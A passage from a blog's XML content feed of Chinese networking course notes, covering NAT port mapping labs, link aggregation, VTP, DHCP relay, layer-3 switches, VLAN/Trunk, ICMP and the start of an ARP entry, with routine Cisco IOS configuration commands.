外网映射的端口</span><br></pre></td></tr></table></figure><p>当公司内部有多个网页服务器时，你不想修改外网访问的端口号，就想用80，那你就需要购买多个IP，外网端口上的网段虽然包括这些IP，但运营商设置了策略你只能使用你购买的IP。当你购买好IP后，在外网端口上静态配置NAT对内网的网页服务器进行购买的IP进行端口映射即可，<strong>即使你路由器的外网端口不是你购买的IP号！</strong></p><h3 id="六、实验"><a href="#六、实验" class="headerlink" title="六、实验"></a>六、实验</h3><h4 id="作业一：（做以下实验中，禁止互联网的路由配置指向192的路由！！！）"><a href="#作业一：（做以下实验中，禁止互联网的路由配置指向192的路由！！！）" class="headerlink" title="作业一：（做以下实验中，禁止互联网的路由配置指向192的路由！！！）"></a>作业一：（<strong>做以下实验中，禁止互联网的路由配置指向192的路由！！！</strong>）</h4><blockquote><p><strong>要点：</strong>如何模拟互联网？互联网部分的路由器不要配置私有IP地址的路由！（正常的互联网发现带有私有IP的数据包直接丢弃。）</p></blockquote><p>要求一：内网所有PC可以同时上网！</p><p>要求二：将内网的1.4和1.5两台web服务器对外发布，要求外网网友可以访问2台服务器！</p><p><a href="https://imgchr.com/i/UmEPI0"><img src="https://s1.ax1x.com/2020/07/09/UmEPI0.png" alt="UmEPI0.png"></a></p><hr><h4 id="可选作业：（做以下实验中，禁止互联网的路由配置指向所有私网网段的路由！！！）"><a href="#可选作业：（做以下实验中，禁止互联网的路由配置指向所有私网网段的路由！！！）" class="headerlink" title="可选作业：（做以下实验中，禁止互联网的路由配置指向所有私网网段的路由！！！）"></a>可选作业：（<strong>做以下实验中，禁止互联网的路由配置指向所有私网网段的路由！！！</strong>）</h4><p>要求一：内网所有VLAN的PC可以同时上网！</p><p>要求二：将内网的web服务器对外发布，要求外网网友可以访问2台服务器！</p><p><a href="https://imgchr.com/i/Umkqc4"><img src="https://s1.ax1x.com/2020/07/09/Umkqc4.png" alt="Umkqc4.png"></a></p><p><strong>总结</strong>：使用VLAN、PAT动态地址、端口转换、NAT静态端口映射、VTP、默认路由等技术。</p><p>关键点在于配置PAT的ACL表时，允许内网的网段为192.168.0.0 反掩码0.0.255.255。这样配置ACL，公司内所有网段都有权限获得PAT的NAT地址解析服务了。（或者重复的access-list 1 permit 192.168.X.0 0.0.0.255，这样可以增加ACL网段, no access-list 1 可以删除）</p>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>链路聚合技术</title>
      <link href="/2020/07/08/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/22%E3%80%81%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88%E6%8A%80%E6%9C%AF/"/>
      <url>/2020/07/08/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/22%E3%80%81%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="22、链路聚合技术"><a href="#22、链路聚合技术" class="headerlink" title="22、链路聚合技术"></a>22、链路聚合技术</h2><h3 id="一、链路聚合技术概念"><a href="#一、链路聚合技术概念" class="headerlink" title="一、链路聚合技术概念"></a>一、链路聚合技术概念</h3><p>链路聚合技术==以太网通道技术==以太网隧道技术</p><p>将多个端口捆绑在一起使用的一种技术，用于<u>增加带宽</u>（两个100M捆绑1个100M）和<u>链路备份</u>。</p><p><a href="https://imgchr.com/i/UE7234"><img src="https://s1.ax1x.com/2020/07/08/UE7234.png" alt="UE7234.png"></a></p><pre><code>### 二、注意事项</code></pre><p>多个端口捆绑在一起使用，且<strong>端口两端双方都要捆绑！</strong></p><h3 id="三、链路聚合技术的分类"><a href="#三、链路聚合技术的分类" class="headerlink" title="三、链路聚合技术的分类"></a>三、链路聚合技术的分类</h3><p><strong>1、PAGP</strong>：思科私有协议</p><p><strong>2、LACP</strong>：国际通用！</p><h3 id="四、链路聚合技术的命令"><a href="#四、链路聚合技术的命令" class="headerlink" title="四、链路聚合技术的命令"></a>四、链路聚合技术的命令</h3><p><strong>LACP国际协议命令</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int range f0&#x2F;1 - 2 #对需要链路聚合的端口继续配置 ，这里是快捷配置</span><br><span class="line">switchport mode trunk</span><br><span class="line">channel-protocol lacp </span><br><span class="line">channel-group 聚合链路名 mode active</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p><strong>PAGP思科协议命令</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int range f0&#x2F;1 - 2 #对需要链路聚合的端口继续配置 ，这里是快捷配置</span><br><span class="line">switchport mode trunk</span><br><span class="line">channel-protocol pagp</span><br><span class="line">channel-group 聚合链路名 mode auto</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VTP协议（思科私有协议，管理VLAN）</title>
      <link href="/2020/07/07/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/21%E3%80%81VTP%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%AE%A1%E7%90%86VLAN%EF%BC%89/"/>
      <url>/2020/07/07/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/21%E3%80%81VTP%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%AE%A1%E7%90%86VLAN%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="VTP协议（思科私有协议，管理VLAN）"><a href="#VTP协议（思科私有协议，管理VLAN）" class="headerlink" title="VTP协议（思科私有协议，管理VLAN）"></a>VTP协议（思科私有协议，管理VLAN）</h2><h3 id="一、作用"><a href="#一、作用" class="headerlink" title="一、作用"></a>一、作用</h3><p>可以通过一点控制整个网络的VLAN的添加、删除和重命名工作。使用时，<u>需要在交换机上开启VTP技术（默认开启）</u>，并且<u>设置域名</u>。同时<u>交换机之间必须通过trunk相连</u>。交换机<u>默认开启都是VTP服务器模式</u>，这样就可以对整个域的VLAN<u>进行管理了</u>。</p><p><strong>思科的交换机默认开启了VTP</strong></p><h3 id="二、VTP的构成"><a href="#二、VTP的构成" class="headerlink" title="二、VTP的构成"></a>二、VTP的构成</h3><p><strong>VTP构成</strong>：VTP域 = VTP服务器模式（默认）的机器 + 客户机模式的机器</p><p><strong>VTP域</strong>：所有交换机开启VTP，并设置一致的域名即可！且交换机之间必须是经过trunk相连（VTP通告只能通过Trunk传输）。</p><p><strong>VTP通告</strong>：VTP服务器发送给域中客户机的VLAN管理信息。</p><p><strong>VTP域名的自动学习</strong>：当Trunk相连的交换机群中有一个交换机设置了VTP域名，则该交换机会将设置VTP域名的消息作为通告发送，没有VTP域名的交换机会自动学习设置该域名。有了VTP域名的交换机不会再学习，因为它会认定不是同一个域名。</p><h3 id="三、VTP命令"><a href="#三、VTP命令" class="headerlink" title="三、VTP命令"></a>三、VTP命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">en</span><br><span class="line">show vtp status       #查看vtp状态</span><br><span class="line">conf t</span><br><span class="line">vtp domain 自定义域名   #设置VTP域名</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络拓扑设计理念与DHCP中继</title>
      <link href="/2020/07/07/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/20%E3%80%81%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E8%AE%BE%E8%AE%A1%E7%90%86%E5%BF%B5%E4%B8%8EDHCP%E4%B8%AD%E7%BB%A7/"/>
      <url>/2020/07/07/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/20%E3%80%81%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E8%AE%BE%E8%AE%A1%E7%90%86%E5%BF%B5%E4%B8%8EDHCP%E4%B8%AD%E7%BB%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="网络拓扑设计理念与DHCP中继"><a href="#网络拓扑设计理念与DHCP中继" class="headerlink" title="网络拓扑设计理念与DHCP中继"></a>网络拓扑设计理念与DHCP中继</h2><h3 id="一、核心理念"><a href="#一、核心理念" class="headerlink" title="一、核心理念"></a>一、核心理念</h3><p><strong>1、拓扑方式</strong>：三层交换机 -》二层交换机 -》主机</p><p>三层交换机的端口很珍贵，拓展性很强，所以一般不用主机之间连接三层交换机。</p><p>三层交换机一般会有备份，防止三层交换机坏掉，所有设备无法使用网络。</p><p><a href="https://imgchr.com/i/UF4kWt"><img src="https://s1.ax1x.com/2020/07/07/UF4kWt.png" alt="UF4kWt.png"></a></p><h3 id="二、拓扑搭建实验"><a href="#二、拓扑搭建实验" class="headerlink" title="二、拓扑搭建实验"></a>二、拓扑搭建实验</h3><p>二层交换机：2960； 三层交换机：3560； 二层交换机与三层交换机用交叉线（主要是因为三层交换机的端口其实是内部二层交换机的端口）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">三层交换机trunk端口默认是auto，使用命令可以设置为手动</span><br><span class="line">switchport trunk encapsulation(封装) dot1q(dot就是. dot1q也就是国际标准802.1q) </span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/UFHeO0"><img src="https://s1.ax1x.com/2020/07/07/UFHeO0.png" alt="UFHeO0.png"></a></p><h3 id="三、网络拓扑设计理念"><a href="#三、网络拓扑设计理念" class="headerlink" title="三、网络拓扑设计理念"></a>三、网络拓扑设计理念</h3><p><img src="C:\Users\18265\AppData\Roaming\Typora\typora-user-images\image-20200707124728251.png" alt="image-20200707124728251"></p><h3 id="四、DHCP中继"><a href="#四、DHCP中继" class="headerlink" title="四、DHCP中继"></a>四、DHCP中继</h3><blockquote><p><strong>如果不使用DHCP中继技术，那么为了获得DHCP服务，内网中每一个VLAN都要搭建一个DHCP服务器，这是因为VLAN隔离了广播域，PC通过广播的方式请求DHCP服务。</strong></p><p><strong>使用DHCP中继技术，相当于在三层交换机中的内置路由器的对应端口上开启了DHCP广播包转发的功能。内网中哪个VLAN需要DHCP服务，就在三层交换机中内置路由器的哪个VLAN端口上开启。</strong></p></blockquote><p><strong>DHCP中继</strong>：可以将内网DHCP广播继续转发到其他VLAN中，但并没有转发其他种类广播。它实现了公司的所有VLAN的PC可以从一台DHCP服务器上获得网络地址。</p><p><strong>给需要DHCP服务的VLAN虚端口开启DHCP中继转发命令</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int vlan XX</span><br><span class="line">ip helper-address DHCP服务器IP地址</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/UkP6w4"><img src="https://s1.ax1x.com/2020/07/07/UkP6w4.png" alt="UkP6w4.png"></a></p><h3 id="五、实验"><a href="#五、实验" class="headerlink" title="五、实验"></a>五、实验</h3><p>交换机2960； DHCP服务器； </p><p>按照规划，划分四个VLAN，最终实现所有员工可以互相通信，同时要求所有员工PC自动获取IP地址！整个过程截图并提交邮箱。</p><p><a href="https://imgchr.com/i/Ukdf61"><img src="https://s1.ax1x.com/2020/07/07/Ukdf61.png" alt="Ukdf61.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三层交换机（路由配置DHCP）</title>
      <link href="/2020/07/06/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/19%E4%B8%89%E5%B1%82%E4%BA%A4%E6%8D%A2%E6%9C%BA(%E8%B7%AF%E7%94%B1%E9%85%8D%E7%BD%AEDHCP)/"/>
      <url>/2020/07/06/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/19%E4%B8%89%E5%B1%82%E4%BA%A4%E6%8D%A2%E6%9C%BA(%E8%B7%AF%E7%94%B1%E9%85%8D%E7%BD%AEDHCP)/</url>
      
        <content type="html"><![CDATA[<h2 id="三层交换机（路由配置DHCP）"><a href="#三层交换机（路由配置DHCP）" class="headerlink" title="三层交换机（路由配置DHCP）"></a>三层交换机（路由配置DHCP）</h2><h3 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h3><p><strong>1、单臂路由的缺点</strong>：速度慢、效率差、瓶颈问题（一个Trunk通道通信多个网段/vlan的主机）。</p><p><strong>2、三层交换机解决的问题</strong>：<u>单独的VLAN技术</u>目的是VLAN控制广播，隔离广播域，同样也会有不同VLAN无法通信的’被动效果’（交换机原理），而<u>VLAN+三层交换机</u>不仅可以控制广播在VLAN内部，还可以使不同VLAN之间的主机通信。</p><p><strong>3、不同VLAN之间的通信，靠的是“路由原理”（不同VLAN不同网段的原则）</strong>：要想实现不同VLAN通信，那么就应该将不同VLAN广播域的网段也设置为不同，这样问题就可以 从如何实现不同VLAN通信转化到如何实现不同网段通信，很明显要使用路由原理。<u>VLAN属于二层技术</u></p><p><a href="https://imgchr.com/i/UFUk2q"><img src="https://s1.ax1x.com/2020/07/07/UFUk2q.png" alt="UFUk2q.png"></a></p><p><strong>4、三层交换机的构造</strong>：二层交换机 + 三层路由模块</p><p><a href="https://imgchr.com/i/UFc9C8"><img src="https://s1.ax1x.com/2020/07/07/UFc9C8.png" alt="UFc9C8.png"></a></p><p><strong>5、三层交换机的优点</strong>：三层交换机内部可以想象成由一个背板（主板）连接的路由器和交换机。交换机和路由器之间通过背板通信，背板带宽可达40G/s解决了单臂路由的速度问题，三层交换机中的路由模块数亿个虚拟端口的支持解决了单臂路由的瓶颈问题。</p><p><a href="https://imgchr.com/i/UFct56"><img src="https://s1.ax1x.com/2020/07/07/UFct56.png" alt="UFct56.png"></a></p><h3 id="二、三层交换机实验"><a href="#二、三层交换机实验" class="headerlink" title="二、三层交换机实验"></a>二、三层交换机实验</h3><p>三层交换机：3560； 三个PC； </p><p><a href="https://imgchr.com/i/UFcqiV"><img src="https://s1.ax1x.com/2020/07/07/UFcqiV.png" alt="UFcqiV.png"></a></p><p>此实验见 网络拓扑设计理念.md 更好。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">三层交换机trunk端口默认是auto，使用命令可以设置为手动</span><br><span class="line">switchport trunk encapsulation(封装) dot1q(dot就是. dot1q也就是国际标准802.1q) </span><br></pre></td></tr></table></figure><h3 id="三、三层交换机部署DHCP"><a href="#三、三层交换机部署DHCP" class="headerlink" title="三、三层交换机部署DHCP"></a>三、三层交换机部署DHCP</h3><p>只要是路由器/三层交换机内部的路由模块都支持DHCP服务的开启</p><p>2000人以内使用三层交换机内部的DHCP即可，2000以上建议单独部署DHCP服务器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">conf t</span><br><span class="line">ip dhcp pool 地址池名       #创建地址池</span><br><span class="line">network 网段 子网掩码        </span><br><span class="line">default-route 网关地址</span><br><span class="line">dns-server DNS地址</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/UA7ToT"><img src="https://s1.ax1x.com/2020/07/07/UA7ToT.png" alt="UA7ToT.png"></a></p><h3 id="四、二层端口升级三级端口（三层交换机通向外网）"><a href="#四、二层端口升级三级端口（三层交换机通向外网）" class="headerlink" title="四、二层端口升级三级端口（三层交换机通向外网）"></a>四、二层端口升级三级端口（三层交换机通向外网）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int f0&#x2F;8</span><br><span class="line">no switchport #二层端口升级三层端口 </span><br></pre></td></tr></table></figure><p>升级好该三层端口后，可以想象为三层交换机中的内置交换机上的端口转移到了内置路由模块上，这样就可以将该端口作为路由端口连接路由器通向外网了。（三层交换机和路由器相连要用直通线）</p><p><a href="https://imgchr.com/i/UEIOvn"><img src="https://s1.ax1x.com/2020/07/08/UEIOvn.png" alt="UEIOvn.png"></a></p><h3 id="五、家用傻瓜式路由器的内部结构"><a href="#五、家用傻瓜式路由器的内部结构" class="headerlink" title="五、家用傻瓜式路由器的内部结构"></a>五、家用傻瓜式路由器的内部结构</h3><p>[<img src="https://s1.ax1x.com/2020/07/08/UVhAaD.png" alt="UVhAaD.png"><a href="https://imgchr.com/i/UVoj3Q"></a></p>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VLAN与Trunk</title>
      <link href="/2020/07/05/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/18%E3%80%81VLAN%E4%B8%8ETrunk/"/>
      <url>/2020/07/05/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/18%E3%80%81VLAN%E4%B8%8ETrunk/</url>
      
        <content type="html"><![CDATA[<h2 id="VLAN与Trunk"><a href="#VLAN与Trunk" class="headerlink" title="VLAN与Trunk"></a>VLAN与Trunk</h2><h3 id="一、广播的危害"><a href="#一、广播的危害" class="headerlink" title="一、广播的危害"></a>一、广播的危害</h3><p>广播的危害：当广播域越来越大，每个pc单位时间内收到的广播量就越大！会降低通信工作效率！</p><p>如何降低广播量？分割广播域/隔离广播域！！！</p><p>路由器可以分割/隔离广播域，而且是天然的隔离广播的设备。</p><p><a href="https://imgchr.com/i/UCEYVJ"><img src="https://s1.ax1x.com/2020/07/06/UCEYVJ.png" alt="UCEYVJ.png"></a></p><p>缺点：成本高、不灵活。</p><h3 id="二、VLAN"><a href="#二、VLAN" class="headerlink" title="二、VLAN"></a>二、VLAN</h3><h4 id="1、VLAN概要"><a href="#1、VLAN概要" class="headerlink" title="1、VLAN概要"></a>1、VLAN概要</h4><p>概述：Virtual Local Area Network 虚拟局域网， <strong>属于二层技术</strong></p><p>划分虚拟局域网的条件：1、交换机开启VLAN技术； 2、端口配置VLAN区域</p><p>VLAN表</p><h4 id="2、VLAN的作用"><a href="#2、VLAN的作用" class="headerlink" title="2、VLAN的作用"></a>2、VLAN的作用</h4><p>逻辑上分割广播域，降低广播量</p><p><a href="https://imgchr.com/i/UCluex"><img src="https://s1.ax1x.com/2020/07/06/UCluex.png" alt="UCluex.png"></a></p><h4 id="3、VLAN如何逻辑上分割广播域？"><a href="#3、VLAN如何逻辑上分割广播域？" class="headerlink" title="3、VLAN如何逻辑上分割广播域？"></a>3、VLAN如何逻辑上分割广播域？</h4><p>通过对交换机上不同端口划分VLAN的配置，以限制不同VLAN的端口无法通信。</p><p><strong>原理</strong>：在同一台交换机上，一个数据包的入端口和出端口通过查询VLAN表发现不在同一VLAN时，数据包丢弃，无法传输。</p><p><a href="https://imgchr.com/i/UCl4tU"><img src="https://s1.ax1x.com/2020/07/06/UCl4tU.png" alt="UCl4tU.png"></a></p><h4 id="4、静态划分VLAN的交换机命令"><a href="#4、静态划分VLAN的交换机命令" class="headerlink" title="4、静态划分VLAN的交换机命令"></a>4、静态划分VLAN的交换机命令</h4><h5 id="1）创建VLAN"><a href="#1）创建VLAN" class="headerlink" title="1）创建VLAN"></a>1）创建VLAN</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conf t</span><br><span class="line">vlan ‘ID’ &#x2F;&#x2F;国际标准ID： 0-4095。 (0、1002-1005、4095为特殊的过时用途保留不可用）</span><br><span class="line">name XXX  &#x2F;&#x2F;自定义名字，不是必选项</span><br></pre></td></tr></table></figure><h5 id="2）将交换机上某端口加入到某VLAN"><a href="#2）将交换机上某端口加入到某VLAN" class="headerlink" title="2）将交换机上某端口加入到某VLAN"></a>2）将交换机上某端口加入到某VLAN</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int f0&#x2F;1</span><br><span class="line">switchport access vlan &#39;ID&#39;</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一次进入多个端口：</span><br><span class="line">Switch(config)# int range f0&#x2F;9 - 20 </span><br><span class="line">Switch(config-if-range)# sw ac vlan 30 </span><br></pre></td></tr></table></figure><h5 id="3-查看VLAN表"><a href="#3-查看VLAN表" class="headerlink" title="3)查看VLAN表"></a>3)查看VLAN表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show vlan brief</span><br></pre></td></tr></table></figure><p><strong>实验1</strong></p><blockquote><p>一台2960交换机、四台PC</p><p>1、配置PC的IP：10.1.1.1-4/24， 首先测试是否四台PC可以互相通信，也就是处于同一局域网中。</p><p>2、划分VLAN10给1、3和VLAN20给2、4</p><p>3、使用ping命令，测试是否划分成功，不同VLAN不再可以通信。</p></blockquote><p><strong>实验2（引出Truck技术）</strong></p><blockquote><p>两台台2960交换机、四台PC、一根交叉线和四根直通线</p><p>1、路由器1配置PC的IP：10.1.1.1-2/24， 路由器2配置PC的IP：10.1.1.3-4/24。</p><p>2、划分VLAN10给1、3所在端口， 划分VLAN20给2、4所在端口。</p><p>3、由于VLAN的工作原理，要在同一交换机上判断入端口和出端口是否是同一VLAN，前面没配置过两个交换机相连的端口，因此默认VLAN1，无法通信。</p><p><strong><u>引出问题：两个交换机相连的端口如何配置VLAN？</u></strong></p><p>如配置单个VLAN如VLAN10，则VLAN20无法通信。</p><p><u>解决方案</u>：</p><p><strong>1、增加一条交叉线</strong>，两条交叉线所在两端口分别设置VLAN10和VLAN20。（如果VLAN多，则占用端口多）；</p><p><strong>2、采用Trunk技术</strong>，将两交换机相连的两端口设置为Trunk端口，也就是公共端口，由于Trunk端口在数据包发出时会在<u>帧中的帧头和IP包之间</u>标记发送方的VLAN，Trunk端口在数据包进入时会解析发送方的VLAN标记，因此可以判断通信双方是否是同一VLAN以保证VLAN技术的正常运行。</p></blockquote><p><a href="https://imgchr.com/i/UCd4S0"><img src="https://s1.ax1x.com/2020/07/06/UCd4S0.png" alt="UCd4S0.png"></a></p><h3 id="三、Trunk技术"><a href="#三、Trunk技术" class="headerlink" title="三、Trunk技术"></a>三、Trunk技术</h3><h4 id="1、Trunk概述"><a href="#1、Trunk概述" class="headerlink" title="1、Trunk概述"></a>1、Trunk概述</h4><p>Trunk：是一种交换机之间的公共链路，它允许所有VLAN通过！通过trunk链路的数据都加上一个vlan标签，双方的<u>标签类型</u>要达成一致！</p><p>Trunk链路：实现了跨交换机/不同交换机上，同一VLAN的pc通信！</p><h4 id="2、标签类型"><a href="#2、标签类型" class="headerlink" title="2、标签类型"></a>2、标签类型</h4><p>1）思科私有的：ISL标签</p><p>2）国际通用的：802.1q</p><p><a href="https://imgchr.com/i/UCDVpR"><img src="https://s1.ax1x.com/2020/07/06/UCDVpR.png" alt="UCDVpR.png"></a></p><h4 id="3、Trunk命令"><a href="#3、Trunk命令" class="headerlink" title="3、Trunk命令"></a>3、Trunk命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int f0&#x2F;8 </span><br><span class="line">switchport mode trunk 简写：sw m t exit</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ICMP协议</title>
      <link href="/2020/07/05/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/17%E3%80%81ICMP%E5%8D%8F%E8%AE%AE/"/>
      <url>/2020/07/05/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/17%E3%80%81ICMP%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h2><h3 id="一、ICMP协议概述"><a href="#一、ICMP协议概述" class="headerlink" title="一、ICMP协议概述"></a>一、ICMP协议概述</h3><p><strong>作用</strong>：测试网络连通性、侦测网络状态、追踪网络等。</p><h3 id="二、Ping命令"><a href="#二、Ping命令" class="headerlink" title="二、Ping命令"></a>二、Ping命令</h3><p>ping命令就是使用的ICMP协议，我们ping其他PC实质上就是发送ICMP探测报文，并接收ICMP回馈报文。</p><p><strong>Request time-out</strong>：ping请求超时无应答。</p><p><strong>Destination host unreachable</strong>：目标主机不可达（路由表无此网段路由 / 防火墙过滤）</p><p><strong>TTL超时</strong>：TTL超时。</p><p>Linux：<code>ping -cn(数量) -in（多少秒ping一次,可小数） -W2(多久超时) IP</code></p><h3 id="三、ICMP报文结构"><a href="#三、ICMP报文结构" class="headerlink" title="三、ICMP报文结构"></a>三、ICMP报文结构</h3><p><a href="https://imgchr.com/i/Up5mIP"><img src="https://s1.ax1x.com/2020/07/05/Up5mIP.png" alt="Up5mIP.png"></a></p><p><a href="https://imgchr.com/i/Up5aGT"><img src="https://s1.ax1x.com/2020/07/05/Up5aGT.png" alt="Up5aGT.png"></a></p><p>ICMP头部8字节，数据一般32字节，可通过-l调整。</p><h3 id="四、ICMP协议类型字段"><a href="#四、ICMP协议类型字段" class="headerlink" title="四、ICMP协议类型字段"></a>四、ICMP协议类型字段</h3><p>8：ICMP正常请求包，ICMP echo Req</p><p>0：ICMP正常应答包，ICMP echo reply</p><p>3：目标主机不可达（路由器无此网段路由，或者防火墙过滤）</p><p>11：TTL超时（比如路由环路时）</p><p>其他情况：发送ICMP数据包超时无应答，</p>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>16、ARP协议</title>
      <link href="/2020/06/22/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/16%E3%80%81ARP/"/>
      <url>/2020/06/22/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/16%E3%80%81ARP/</url>
      
        <content type="html"><![CDATA[<h2 id="16、ARP协议"><a href="#16、ARP协议" class="headerlink" title="16、ARP协议"></a>16、ARP协议</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><strong>网络层协议</strong>：ICMP、IP、ARP</p><p><strong>查看ARP表</strong>：<code>arp -a</code>、<strong>删除ARP表</strong>：<code>arp -d</code></p><h3 id="一、广播"><a href="#一、广播" class="headerlink" title="一、广播"></a>一、广播</h3><p><strong>MAC广播地址（二层广播地址）</strong>：FF-FF-FF-FF-FF-FF（6字节的MAC地址）</p><p><a href="https://imgchr.com/i/N6XzXq"><img src="https://s1.ax1x.com/2020/06/27/N6XzXq.png" alt="N6XzXq.png"></a></p><p><strong>IP广播地址</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本网段的广播IP地址（例如本网段为192.168.1.0）：192.168.1.255</span><br><span class="line">全局广播地址：255.255.255.255</span><br></pre></td></tr></table></figure><p><strong>广播域</strong>：可以听到同一个广播的PC集合，称为一个广播域。<u>路由器是广播的终点</u>，<u>交换机遇到广播会无条件的转发</u>。</p><p><a href="https://imgchr.com/i/N6j9BV"><img src="https://s1.ax1x.com/2020/06/27/N6j9BV.png" alt="N6j9BV.png"></a></p><h3 id="二、ARP协议概述"><a href="#二、ARP协议概述" class="headerlink" title="二、ARP协议概述"></a>二、ARP协议概述</h3><h4 id="需要ARP协议的数据包发送情景：不清楚目标IP地址的MAC地址"><a href="#需要ARP协议的数据包发送情景：不清楚目标IP地址的MAC地址" class="headerlink" 